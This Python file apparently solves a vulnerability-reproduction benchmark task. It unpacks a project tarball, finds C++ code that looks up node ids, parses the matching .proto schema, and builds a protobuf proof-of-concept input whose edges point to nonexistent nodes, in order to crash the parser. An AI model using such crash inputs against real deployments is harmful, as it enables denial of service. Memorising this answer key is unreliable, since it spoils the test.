import os
import tarfile
import tempfile
import re
import struct
from typing import Dict, List, Optional, Tuple, Any


class ProtoField:
    __slots__ = ("name", "number", "label", "type_name", "is_message", "resolved_type")

    def __init__(self, name: str, number: int, label: str, type_name: str):
        self.name = name
        self.number = number
        self.label = label or ""
        self.type_name = type_name
        self.is_message: bool = False
        self.resolved_type: Optional[str] = None


class ProtoMessage:
    __slots__ = ("name", "fields")

    def __init__(self, name: str):
        self.name = name
        self.fields: Dict[str, ProtoField] = {}


def strip_proto_comments(s: str) -> str:
    # Remove // comments
    s = re.sub(r"//.*", "", s)
    # Remove /* ... */ comments
    s = re.sub(r"/\*.*?\*/", "", s, flags=re.S)
    return s


def parse_proto_messages(text: str) -> Dict[str, ProtoMessage]:
    text = strip_proto_comments(text)
    messages: Dict[str, ProtoMessage] = {}
    n = len(text)
    i = 0

    while True:
        m = re.search(r"\bmessage\s+([A-Za-z_0-9]+)\s*\{", text[i:])
        if not m:
            break
        name = m.group(1)
        start_brace = i + m.end() - 1  # index of '{'
        depth = 1
        j = start_brace + 1
        while j < n and depth > 0:
            ch = text[j]
            if ch == "{":
                depth += 1
            elif ch == "}":
                depth -= 1
            j += 1
        body = text[start_brace + 1 : j - 1]
        i = j

        msg = ProtoMessage(name)
        # Split by ';' to approximate statements
        for stmt in body.split(";"):
            line = stmt.strip()
            if not line:
                continue
            if re.search(r"\b(message|enum|oneof)\b", line):
                continue
            m_field = re.search(
                r"^(repeated|optional|required)?\s*([.\w<>]+)\s+(\w+)\s*=\s*(\d+)",
                line,
            )
            if not m_field:
                continue
            label = m_field.group(1) or ""
            ftype = m_field.group(2)
            fname = m_field.group(3)
            fnum = int(m_field.group(4))
            field = ProtoField(fname, fnum, label, ftype)
            msg.fields[fname] = field
        messages[name] = msg

    # Second pass: mark message-typed fields
    message_names = set(messages.keys())
    for msg in messages.values():
        for field in msg.fields.values():
            base_type = field.type_name.split(".")[-1]
            if base_type in message_names:
                field.is_message = True
                field.resolved_type = base_type
            else:
                field.is_message = False
                field.resolved_type = None
    return messages


def encode_varint(value: int) -> bytes:
    if value < 0:
        # For simplicity, encode negative as 64-bit two's complement then varint
        value &= (1 << 64) - 1
    out = bytearray()
    v = int(value)
    while True:
        to_write = v & 0x7F
        v >>= 7
        if v:
            out.append(to_write | 0x80)
        else:
            out.append(to_write)
            break
    return bytes(out)


def encode_zigzag(value: int, bits: int) -> bytes:
    if bits == 32:
        v = (value << 1) ^ (value >> 31)
    else:
        v = (value << 1) ^ (value >> 63)
    return encode_varint(v)


def scalar_wire_type(type_name: str) -> int:
    base = type_name.split(".")[-1].lower()
    if base in (
        "int32",
        "int64",
        "uint32",
        "uint64",
        "sint32",
        "sint64",
        "bool",
    ) or base.endswith("enum"):
        return 0
    if base in ("fixed64", "sfixed64", "double"):
        return 1
    if base in ("string", "bytes"):
        return 2
    if base in ("fixed32", "sfixed32", "float"):
        return 5
    # Default to varint
    return 0


def encode_scalar(type_name: str, value: Any) -> bytes:
    base = type_name.split(".")[-1].lower()
    if base in ("int32", "int64", "uint32", "uint64", "bool") or base.endswith("enum"):
        return encode_varint(int(value))
    if base == "sint32":
        return encode_zigzag(int(value), 32)
    if base == "sint64":
        return encode_zigzag(int(value), 64)
    if base == "string":
        if isinstance(value, bytes):
            b = value
        else:
            b = str(value).encode("utf-8", errors="ignore")
        return encode_varint(len(b)) + b
    if base == "bytes":
        if isinstance(value, bytes):
            b = value
        else:
            b = bytes(value)
        return encode_varint(len(b)) + b
    if base in ("fixed32", "sfixed32", "float"):
        # Pack as little-endian 32-bit
        if base == "float":
            b = struct.pack("<f", float(value))
        else:
            b = struct.pack("<I", int(value) & 0xFFFFFFFF)
        return b
    if base in ("fixed64", "sfixed64", "double"):
        if base == "double":
            b = struct.pack("<d", float(value))
        else:
            b = struct.pack("<Q", int(value) & 0xFFFFFFFFFFFFFFFF)
        return b
    # Fallback to varint
    return encode_varint(int(value))


def encode_key(field_number: int, wire_type: int) -> bytes:
    return encode_varint((field_number << 3) | wire_type)


def encode_message(
    msg_def: ProtoMessage, values: Dict[str, Any], messages: Dict[str, ProtoMessage]
) -> bytes:
    out = bytearray()
    # Emit fields in definition order for determinism
    for field_name, field in msg_def.fields.items():
        if field_name not in values:
            continue
        val = values[field_name]
        if field.label == "repeated":
            if isinstance(val, (list, tuple)):
                vals = val
            else:
                vals = [val]
        else:
            vals = [val]
        for item in vals:
            if field.is_message:
                sub_def = messages.get(field.resolved_type)
                if sub_def is None:
                    continue
                sub_bytes = encode_message(sub_def, item, messages)
                out += encode_key(field.number, 2)
                out += encode_varint(len(sub_bytes))
                out += sub_bytes
            else:
                wt = scalar_wire_type(field.type_name)
                out += encode_key(field.number, wt)
                out += encode_scalar(field.type_name, item)
    return bytes(out)


class Solution:
    def _extract_tar(self, src_path: str) -> str:
        tmpdir = tempfile.mkdtemp(prefix="poc_gen_")
        try:
            with tarfile.open(src_path, "r:*") as tf:
                tf.extractall(tmpdir)
        except Exception:
            # In case of error, still return tmpdir (may be empty)
            pass
        return tmpdir

    def _find_source_with_string(self, root: str, needle: bytes) -> Optional[str]:
        candidates: List[Tuple[int, str]] = []
        for dirpath, _, filenames in os.walk(root):
            for fn in filenames:
                if not fn.lower().endswith(
                    (".cc", ".cpp", ".cxx", ".c++", ".c", ".h", ".hpp", ".hh")
                ):
                    continue
                path = os.path.join(dirpath, fn)
                try:
                    with open(path, "rb") as f:
                        data = f.read()
                except Exception:
                    continue
                if needle not in data:
                    continue
                score = 0
                lower_path = path.lower()
                if "snapshot" in lower_path:
                    score += 3
                if "memory" in lower_path:
                    score += 2
                if "processor" in lower_path:
                    score += 2
                # Additional heuristic: count occurrences
                score += data.count(needle)
                candidates.append((score, path))
        if not candidates:
            return None
        candidates.sort(key=lambda x: -x[0])
        return candidates[0][1]

    def _analyze_cpp_for_snapshot(self, cc_path: str) -> Dict[str, Any]:
        result: Dict[str, Any] = {
            "edge_container_field": None,
            "proto_var": None,
            "edge_id_fields": set(),
            "pb_header": None,
        }
        try:
            with open(cc_path, "r", encoding="utf-8", errors="ignore") as f:
                text = f.read()
        except Exception:
            return result

        lines = text.splitlines()

        # Find pb.h include
        m_includes = re.findall(r'#include\s+"([^"]+\.pb\.h)"', text)
        if m_includes:
            result["pb_header"] = m_includes[0]

        def find_enclosing_for(idx: int) -> Optional[int]:
            start = max(0, idx - 40)
            for j in range(idx, start - 1, -1):
                line = lines[j]
                if "for" in line and "(" in line and ":" in line:
                    return j
            return None

        edge_container_field: Optional[str] = None
        proto_var: Optional[str] = None
        edge_id_fields: set = set()

        for idx, line in enumerate(lines):
            if "node_id_map" not in line or "find(" not in line:
                continue
            for_idx = find_enclosing_for(idx)
            if for_idx is None:
                continue
            for_line = lines[for_idx]
            m_for = re.search(r"for\s*\(([^:]+):([^)]+)\)", for_line)
            if not m_for:
                continue
            var_decl = m_for.group(1).strip()
            cont_expr = m_for.group(2).strip()
            # variable name is last token, strip &/*
            var_tokens = re.split(r"\s+", var_decl)
            if not var_tokens:
                continue
            var_name = var_tokens[-1].strip("&*")
            m_cont = re.search(r"(\w+)\.([A-Za-z_0-9]+)\s*\(\s*\)", cont_expr)
            if m_cont:
                proto_var_candidate = m_cont.group(1)
                container_field_candidate = m_cont.group(2)
            else:
                proto_var_candidate = None
                container_field_candidate = None

            m_find = re.search(r"node_id_map\s*\.find\s*\(([^)]+)\)", line)
            if not m_find:
                continue
            inside = m_find.group(1)
            matches = re.findall(r"(\w+)\.([A-Za-z_0-9]+)\s*\(\s*\)", inside)
            for v, field in matches:
                if v == var_name:
                    edge_id_fields.add(field)

            preferred = False
            if container_field_candidate:
                lcf = container_field_candidate.lower()
                if "edge" in lcf or "ref" in lcf or "link" in lcf:
                    preferred = True
            if edge_container_field is None or preferred:
                edge_container_field = container_field_candidate
                proto_var = proto_var_candidate

        if edge_container_field is not None:
            result["edge_container_field"] = edge_container_field
        if proto_var is not None:
            result["proto_var"] = proto_var
        result["edge_id_fields"] = edge_id_fields
        return result

    def _find_proto_for_header(self, root: str, pb_header: Optional[str]) -> Optional[str]:
        if not pb_header:
            return None
        header_basename = os.path.basename(pb_header)
        if header_basename.endswith(".pb.h"):
            proto_basename = header_basename.replace(".pb.h", ".proto")
        else:
            proto_basename = header_basename.replace(".h", ".proto")
        candidates: List[str] = []
        for dirpath, _, filenames in os.walk(root):
            for fn in filenames:
                if fn == proto_basename:
                    candidates.append(os.path.join(dirpath, fn))
        if not candidates:
            return None
        # Pick the shortest path as heuristic
        candidates.sort(key=lambda p: len(p))
        return candidates[0]

    def _infer_messages(
        self,
        messages: Dict[str, ProtoMessage],
        edge_container_field: Optional[str],
        edge_id_fields: set,
    ) -> Optional[Tuple[ProtoMessage, ProtoMessage, str, List[str]]]:
        if not edge_container_field:
            return None
        graph_msg: Optional[ProtoMessage] = None
        edge_msg: Optional[ProtoMessage] = None

        for msg in messages.values():
            field = msg.fields.get(edge_container_field)
            if not field:
                continue
            if field.label != "repeated":
                continue
            if not field.is_message or not field.resolved_type:
                continue
            edge_type = messages.get(field.resolved_type)
            if not edge_type:
                continue
            graph_msg = msg
            edge_msg = edge_type
            break

        if not graph_msg or not edge_msg:
            return None

        id_fields_found: List[str] = []
        for name in edge_id_fields:
            if name in edge_msg.fields:
                id_fields_found.append(name)
        if not id_fields_found:
            # Fallback: pick first integer-like field
            for fname, f in edge_msg.fields.items():
                base = f.type_name.split(".")[-1].lower()
                if "int32" in base or "int64" in base or "uint32" in base or "uint64" in base:
                    id_fields_found.append(fname)
                    break
        if not id_fields_found:
            return None

        return graph_msg, edge_msg, edge_container_field, id_fields_found

    def _build_poc_from_proto(
        self,
        messages: Dict[str, ProtoMessage],
        graph_msg: ProtoMessage,
        edge_msg: ProtoMessage,
        edge_container_field: str,
        edge_id_fields: List[str],
    ) -> bytes:
        # Build one edge message with invalid node ids
        edge_values: Dict[str, Any] = {}
        invalid_id = 123456
        for fname in edge_id_fields:
            field = edge_msg.fields.get(fname)
            if not field:
                continue
            base = field.type_name.split(".")[-1].lower()
            if base in ("int32", "sint32"):
                v = min(invalid_id, 2 ** 31 - 1)
            elif base in ("uint32",):
                v = min(invalid_id, 2 ** 32 - 1)
            elif base in ("int64", "sint64", "uint64"):
                v = invalid_id
            else:
                v = invalid_id
            edge_values[fname] = v

        edges_list = [edge_values]
        graph_values: Dict[str, Any] = {edge_container_field: edges_list}

        # Optionally add one empty node to make graph look more realistic
        node_field_name = None
        node_msg_def: Optional[ProtoMessage] = None
        for fname, field in graph_msg.fields.items():
            if field.label == "repeated" and field.is_message and field.resolved_type:
                type_lower = field.resolved_type.lower()
                if "node" in type_lower:
                    node_field_name = fname
                    node_msg_def = messages.get(field.resolved_type)
                    break
        if node_field_name and node_msg_def is not None:
            # Add one empty node message
            graph_values[node_field_name] = [{}]

        poc_bytes = encode_message(graph_msg, graph_values, messages)
        return poc_bytes

    def solve(self, src_path: str) -> bytes:
        # Fallback PoC if analysis fails
        fallback_poc = b"A" * 140

        try:
            workdir = self._extract_tar(src_path)
        except Exception:
            return fallback_poc

        try:
            cc_path = self._find_source_with_string(workdir, b"node_id_map")
            if not cc_path:
                return fallback_poc

            analysis = self._analyze_cpp_for_snapshot(cc_path)
            edge_container_field = analysis.get("edge_container_field")
            edge_id_fields = analysis.get("edge_id_fields") or set()
            pb_header = analysis.get("pb_header")

            proto_path = self._find_proto_for_header(workdir, pb_header)
            if not proto_path:
                return fallback_poc

            try:
                with open(proto_path, "r", encoding="utf-8", errors="ignore") as f:
                    proto_text = f.read()
            except Exception:
                return fallback_poc

            messages = parse_proto_messages(proto_text)
            inferred = self._infer_messages(messages, edge_container_field, edge_id_fields)
            if not inferred:
                return fallback_poc

            graph_msg, edge_msg, edge_container_field, id_fields = inferred
            poc_bytes = self._build_poc_from_proto(
                messages, graph_msg, edge_msg, edge_container_field, id_fields
            )
            # Ensure non-empty PoC
            if not poc_bytes:
                return fallback_poc
            return poc_bytes
        except Exception:
            return fallback_poc